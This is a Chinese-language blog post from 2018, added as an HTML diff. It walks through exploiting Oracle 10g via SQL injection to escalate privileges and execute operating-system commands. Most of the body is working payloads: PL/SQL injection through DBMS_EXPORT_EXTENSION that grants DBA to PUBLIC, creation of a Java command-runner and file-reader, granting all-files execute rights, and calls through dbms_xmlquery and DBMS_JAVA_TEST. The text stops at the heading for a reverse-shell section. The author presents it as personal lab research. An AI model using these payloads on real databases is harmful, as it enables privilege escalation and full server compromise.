@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.7.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-tonyGreen.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-tony.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-tony.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"redn3ck.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x01 Oracle安装CentOS 7 安装oracle10g，装了一天，特此记录   oracle9i,10G,11G,各版本下载资源 Centos6/7下静默安装oracle10g  0x02 命令执行本文测试环境均为：  CentOS Linux release 7.2.1511 (Core) Oracle Database 10g Enterprise Edition Release">
+<meta name="keywords" content="注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Oracle注入 - 命令执行&amp;Shell反弹">
+<meta property="og:url" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/index.html">
+<meta property="og:site_name" content="redn3ck&#39;s blog">
+<meta property="og:description" content="0x01 Oracle安装CentOS 7 安装oracle10g，装了一天，特此记录   oracle9i,10G,11G,各版本下载资源 Centos6/7下静默安装oracle10g  0x02 命令执行本文测试环境均为：  CentOS Linux release 7.2.1511 (Core) Oracle Database 10g Enterprise Edition Release">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/extension_linxruncmd_01.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/newcontext_all_objects_01.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/newcontext_java_policy_01.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/newcontext_linxruncmd_error_01.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/newcontext_java_policy_01_t00ls.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/newcontext_java_policy_01_t00ls.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/newcontext_java_policy_02_suifeng.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/newcontext_object_id_01.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/newcontext_all_objects_02.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/newcontext_linxruncmd_01.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/newcontext_linxruncmd_02.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/test.funcall_error.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/test.funcall_01.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/reverse.png">
+<meta property="og:updated_time" content="2018-05-02T08:45:42.743Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Oracle注入 - 命令执行&amp;Shell反弹">
+<meta name="twitter:description" content="0x01 Oracle安装CentOS 7 安装oracle10g，装了一天，特此记录   oracle9i,10G,11G,各版本下载资源 Centos6/7下静默安装oracle10g  0x02 命令执行本文测试环境均为：  CentOS Linux release 7.2.1511 (Core) Oracle Database 10g Enterprise Edition Release">
+<meta name="twitter:image" content="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/extension_linxruncmd_01.png">
+
+<link rel="canonical" href="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Oracle注入 - 命令执行&Shell反弹 | redn3ck's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">redn3ck's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">人不会飞就努力学走</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-read">
+
+    <a href="/read/" rel="section"><i class="fa fa-book fa-fw"></i>读书</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blogAvatar2.jpg">
+      <meta itemprop="name" content="redn3ck">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="redn3ck's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Oracle注入 - 命令执行&Shell反弹
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-04-25 20:49:41" itemprop="dateCreated datePublished" datetime="2018-04-25T20:49:41+08:00">2018-04-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2018-05-02 16:45:42" itemprop="dateModified" datetime="2018-05-02T16:45:42+08:00">2018-05-02</time>
+              </span>
+
+          
+            <span id="/2018/04/25/Oracle注入-命令执行-Shell反弹/" class="post-meta-item leancloud_visitors" data-flag-title="Oracle注入 - 命令执行&Shell反弹" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2018/04/25/Oracle注入-命令执行-Shell反弹/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018/04/25/Oracle注入-命令执行-Shell反弹/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0x01-Oracle安装"><a href="#0x01-Oracle安装" class="headerlink" title="0x01 Oracle安装"></a>0x01 Oracle安装</h1><p>CentOS 7 安装oracle10g，装了一天，特此记录 </p>
+<blockquote>
+<p><a href="http://blog.51cto.com/semiter/1251332" target="_blank" rel="noopener">oracle9i,10G,11G,各版本下载资源</a></p>
+<p><a href="https://blog.csdn.net/u013938484/article/details/51175501" target="_blank" rel="noopener">Centos6/7下静默安装oracle10g</a></p>
+</blockquote>
+<h1 id="0x02-命令执行"><a href="#0x02-命令执行" class="headerlink" title="0x02 命令执行"></a>0x02 命令执行</h1><p>本文测试环境均为：</p>
+<blockquote>
+<p>CentOS Linux release 7.2.1511 (Core)</p>
+<p>Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit Production</p>
+</blockquote>
+<p>执行方式很多种，这边只研究Oracle10g，并且本地实测成功的</p>
+<ul>
+<li><code>DBMS_EXPORT_EXTENSION()</code></li>
+<li><code>dbms_xmlquery.newcontext()</code></li>
+<li><code>DBMS_JAVA_TEST.FUNCALL()</code></li>
+</ul>
+<a id="more"></a>
+<font color="red">注意：注入时需去除末尾分号<code>;</code> </font>
+
+<h2 id="方法1-DBMS-EXPORT-EXTENSION"><a href="#方法1-DBMS-EXPORT-EXTENSION" class="headerlink" title="方法1. DBMS_EXPORT_EXTENSION()"></a>方法1. DBMS_EXPORT_EXTENSION()</h2><blockquote>
+<ul>
+<li>影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</li>
+<li>权限：None</li>
+<li>详情：这个软件包有许多易受PL/SQL注入攻击的函数。这些函数由SYS拥有，作为SYS执行并且可由PUBLIC执行。因此，如果SQL注入处于上述任何未修补的Oracle数据库版本中，那么攻击者可以调用该函数并直接执行SYS查询。</li>
+</ul>
+</blockquote>
+<p>提权：该请求将导致查询”GRANT DBA TO PUBLIC”以SYS身份执行。 因为这个函数允许PL / SQL缺陷（PL / SQL注入）。一旦这个请求成功执行，PUBLIC获取DBA角色，从而提升当前user的特权<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure></p>
+<h3 id="使用java"><a href="#使用java" class="headerlink" title="使用java"></a>使用java</h3><h4 id="（1-创建Java库"><a href="#（1-创建Java库" class="headerlink" title="（1) 创建Java库"></a>（1) 创建Java库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<h4 id="2-赋予Java权限"><a href="#2-赋予Java权限" class="headerlink" title="(2) 赋予Java权限"></a>(2) 赋予Java权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&gt;'''''''', ''''''''execute'''''''');end;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<h4 id="3-创建函数"><a href="#3-创建函数" class="headerlink" title="(3) 创建函数"></a>(3) 创建函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<h4 id="4-赋予函数执行权限"><a href="#4-赋予函数执行权限" class="headerlink" title="(4) 赋予函数执行权限"></a>(4) 赋予函数执行权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<h4 id="5-执行"><a href="#5-执行" class="headerlink" title="(5) 执行"></a>(5) 执行</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.LinxRunCMD(<span class="string">'/bin/bash -c /usr/bin/whoami'</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<p><img src="extension_linxruncmd_01.png" alt="extension_linxruncmd_01"></p>
+<h2 id="方法2-dbms-xmlquery-newcontext"><a href="#方法2-dbms-xmlquery-newcontext" class="headerlink" title="方法2. dbms_xmlquery.newcontext()"></a>方法2. dbms_xmlquery.newcontext()</h2><p>此方法成功前提</p>
+<blockquote>
+<ul>
+<li>影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</li>
+</ul>
+</blockquote>
+<p>即<strong>方法1</strong> 中DBMS_EXPORT_EXTENSION存在漏洞情况下，否则赋予权限时无法成功</p>
+<h4 id="1-创建java包"><a href="#1-创建java包" class="headerlink" title="(1) 创建java包"></a>(1) 创建java包</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;'';commit;end;'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
+<p>通过以下命令可以查看all_objects内部改变：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">'%LINX%'</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">'%Linx%'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="newcontext_all_objects_01.png" alt="newcontext_all_objects_01"></p>
+<h4 id="2-赋予当前用户java权限"><a href="#2-赋予当前用户java权限" class="headerlink" title="(2) 赋予当前用户java权限"></a>(2) 赋予当前用户java权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--当前用户查看</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''YY'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&lt;ALL FILES&gt;&gt;'''''''', ''''''''execute'''''''');end;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
+<p>查看可用的java权限列表，通过以下命令查看赋权情况</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_java_policy <span class="keyword">where</span> grantee_name=<span class="string">'YY'</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="newcontext_java_policy_01.png" alt="newcontext_java_policy_01"></p>
+<p>若赋权失败，最后执行命令时会报如下错误<br><img src="newcontext_linxruncmd_error_01.png" alt="newcontext_linxruncmd_error_01"></p>
+<p>此处很坑，前后折腾，不知道哪里问题，有时可以执行命令，有时不能，网上找了太多赋权命令，不知是哪一条成功，导致我恢复快照不下10次测试问题到底出在哪。</p>
+<p>最后找到上述查看赋权情况命令，才找出哪条赋权命令能成功。所以，坑在哪里？</p>
+<h5 id="T00ls"><a href="#T00ls" class="headerlink" title="T00ls"></a><a href="https://www.t00ls.net/thread-35507-1-1.html" target="_blank" rel="noopener">T00ls</a></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''&lt;&lt;ALL FILES&gt;&gt;'''',''''EXECUTE'''');end;''commit;end;'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
+<p><img src="newcontext_java_policy_01_t00ls.png" alt="newcontext_java_policy_01_t00ls"><br>显而易见，根本没赋权成功<br>关于上述赋权失败，评论里作者回复使用下述命令<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''grant javauserpriv to YY''commit;end;'</span>) <span class="keyword">from</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''grant javasyspriv to YY''commit;end;'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure></p>
+<p><img src="newcontext_java_policy_01_t00ls.png" alt="newcontext_java_policy_01_t00ls"></p>
+<p>显然，一样的结果</p>
+<h5 id="随风’s-blog"><a href="#随风’s-blog" class="headerlink" title="随风’s blog"></a><a href="https://www.iswin.org/2015/06/13/hack-oracle/" target="_blank" rel="noopener">随风’s blog</a></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&lt;ALL FILES&gt;&gt;'''''''',''''''''execute'''''''');end;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
+<p><img src="newcontext_java_policy_02_suifeng.png" alt="newcontext_java_policy_02_suifeng"></p>
+<p>可见，两种方式均无果</p>
+<h4 id="3-创建函数-1"><a href="#3-创建函数-1" class="headerlink" title="(3) 创建函数"></a>(3) 创建函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
+<p>判断是否创建成功<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> OBJECT_ID <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name =<span class="string">'LINXRUNCMD'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="newcontext_object_id_01.png" alt="newcontext_object_id_01"></p>
+<p>也可通过查看all_objects内部改变判断<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">'%LINX%'</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">'%Linx%'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="newcontext_all_objects_02.png" alt="newcontext_all_objects_02"></p>
+<p>若想删除创建的函数，通过以下命令删除<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> LinxRunCMD</span><br></pre></td></tr></table></figure></p>
+<h4 id="4-执行"><a href="#4-执行" class="headerlink" title="(4) 执行"></a>(4) 执行</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> LinxRunCMD(<span class="string">'id'</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<p>恭喜！！！</p>
+<p><img src="newcontext_linxruncmd_01.png" alt="newcontext_linxruncmd_01"></p>
+<p><img src="newcontext_linxruncmd_02.png" alt="newcontext_linxruncmd_02"></p>
+<h2 id="方法3-DBMS-JAVA-TEST-FUNCALL"><a href="#方法3-DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="方法3. DBMS_JAVA_TEST.FUNCALL()"></a>方法3. DBMS_JAVA_TEST.FUNCALL()</h2><h3 id="使用java-privileges"><a href="#使用java-privileges" class="headerlink" title="使用java privileges"></a>使用java privileges</h3><blockquote>
+<ul>
+<li>影响版本： 10g R2, 11g R1, 11g R2</li>
+<li>权限：Java Permissions.</li>
+</ul>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">'oracle/aurora/util/Wrapper'</span>,<span class="string">'main'</span>,<span class="string">'/bin/bash'</span>,<span class="string">'-c'</span>,<span class="string">'pwd &gt; /tmp/pwd.txt'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
+<p>执行时报如下错，貌似没赋权？实际上赋权后还是一样的错误</p>
+<p><img src="test.funcall_error.png" alt="test.funcall_error 2"></p>
+<p>但不影响命令的执行</p>
+<p><img src="test.funcall_01.png" alt="test.funcall_01"></p>
+<p>该方式无回显，在注入时不太方便利用，但可通过此方式反弹 : )</p>
+<h1 id="0x03-反弹shell"><a href="#0x03-反弹shell" class="headerlink" title="0x03 反弹shell"></a>0x03 反弹shell</h1><p>网上铺天盖地windows的payload，linux下根本无法反弹，自己手动测试java代码反弹，然后放入oracle Sql</p>
+<p>java反弹代码如下：</p>
